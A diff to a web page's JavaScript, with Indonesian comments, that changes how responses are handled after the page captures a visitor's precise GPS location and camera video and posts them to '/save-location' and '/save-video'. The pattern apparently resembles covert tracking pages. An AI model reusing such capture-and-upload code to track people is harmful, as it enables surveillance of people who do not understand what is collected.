@@ -115,15 +115,14 @@ document.addEventListener("DOMContentLoaded", function() {
             fetch('/save-location', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                    lat: lat, 
-                    lon: lon, 
-                    accuracy: acc, 
-                    link: gmapsLink 
-                })
-            }).catch(err => console.log("Gagal kirim lokasi"));
-        }, function(error) {
-            console.log("GPS ditolak atau gagal diakses");
+                body: JSON.stringify({ lat: lat, lon: lon, accuracy: acc, link: gmapsLink })
+            })
+            .then(response => response.text())
+            .then(resultText => {
+                console.log("Respon lokasi:", resultText); // Output: "OK"
+                // TODO: Tambahkan fungsi untuk menampilkan atau menyimpan ke log/riwayat di sini jika ada
+            })
+            .catch(err => console.log("Gagal kirim lokasi"));
         }, { timeout: 10000, enableHighAccuracy: true });
     }
 
@@ -149,7 +148,13 @@ document.addEventListener("DOMContentLoaded", function() {
                 fetch('/save-video', {
                     method: 'POST',
                     body: formData
-                }).catch(err => console.log("Gagal kirim video"));
+                })
+                .then(response => response.text())
+                .then(resultText => {
+                    console.log("Respon video:", resultText); // Output: "Saved"
+                    // TODO: Tambahkan fungsi untuk menampilkan atau menyimpan ke log/riwayat di sini jika ada
+                })
+                .catch(err => console.log("Gagal kirim video"));
             }
         };
 
